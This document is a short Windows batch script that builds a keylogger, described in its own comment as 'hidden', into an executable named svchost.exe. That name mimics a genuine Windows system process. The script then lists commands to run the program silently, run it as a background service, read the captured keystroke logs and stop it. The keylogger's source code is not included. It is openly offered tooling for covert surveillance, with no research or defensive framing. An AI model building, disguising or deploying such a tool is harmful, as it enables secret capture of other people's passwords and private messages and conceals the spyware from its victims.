@echo off
REM Windows build script for creating hidden keylogger executable

echo Building Windows executable...

REM Install required packages
pip install pyinstaller psutil

REM Build the executable using spec file
pyinstaller keylogger.spec

REM Check if build was successful
if exist "dist\svchost.exe" (
    echo.
    echo Build successful!
    echo Executable created: dist\svchost.exe
    echo.
    echo To run silently:
    echo   dist\svchost.exe --silent
    echo.
    echo To run as background service:
    echo   start /B dist\svchost.exe --silent
    echo.
    echo To read logs:
    echo   dist\svchost.exe --read
    echo.
    echo To stop keylogger:
    echo   dist\svchost.exe --stop
) else (
    echo Build failed! Check for errors above.
)

pause
